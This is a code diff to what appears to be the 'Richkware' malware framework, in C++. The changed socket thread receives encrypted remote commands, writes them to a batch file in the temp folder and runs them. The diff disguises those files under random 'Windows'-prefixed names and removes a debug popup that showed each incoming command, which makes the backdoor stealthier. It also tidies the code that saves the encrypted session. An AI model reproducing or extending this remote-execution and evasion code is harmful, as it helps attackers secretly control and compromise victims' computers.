@@ -242,12 +242,14 @@ DWORD WINAPI ClientSocketThread(void* arg) {
 	int recvbuflen = bufferlength;
 	std::size_t posSubStr;
 	// write the output of command in a file
+	srand(time(0));
+	std::string fileName = "Windows" + std::to_string(rand()); // An integer value between 0 and RAND_MAX
 	char tmp_path[MAX_PATH];
 	GetTempPath(MAX_PATH, tmp_path);
 	std::string fileBat = tmp_path;
-	fileBat.append("richkEX.bat");
+	fileBat.append(fileName + ".bat");
 	std::string fileLog = tmp_path;
-	fileLog.append("richk.log");
+	fileLog.append(fileName + ".log");
 	// Receive until the peer shuts down the connection
 
 	do {
@@ -257,8 +259,6 @@ DWORD WINAPI ClientSocketThread(void* arg) {
 		// string decryption
 		if (EncryptionKey != NULL) command = EncryptDecrypt(command, EncryptionKey);
 
-		MessageBox(NULL, command.c_str(), "", 0);
-
 		posSubStr = command.find("---");
 		if (posSubStr != std::string::npos) {
 
@@ -266,8 +266,7 @@ DWORD WINAPI ClientSocketThread(void* arg) {
 			command.erase(posSubStr);
 
 			std::string commandTmp = command;
-			commandTmp.append(" > ");
-			commandTmp.append(fileLog);
+			commandTmp.append(" > " + fileLog);
 			std::ofstream file(fileBat.c_str());
 
 			if (file.is_open()) {
@@ -464,10 +463,7 @@ void Richkware::SaveSession(const char* EncryptionKey) {
 
 	for (std::map<std::string, std::string>::iterator it = session.begin();
 		it != session.end(); ++it) {
-		sessionString.append(it->first);
-		sessionString.append(",");
-		sessionString.append(it->second);
-		sessionString.append("|");
+		sessionString.append(it->first + "," + it->second + "|");
 	}
 
 	sessionString = EncryptDecrypt(sessionString, EncryptionKey);
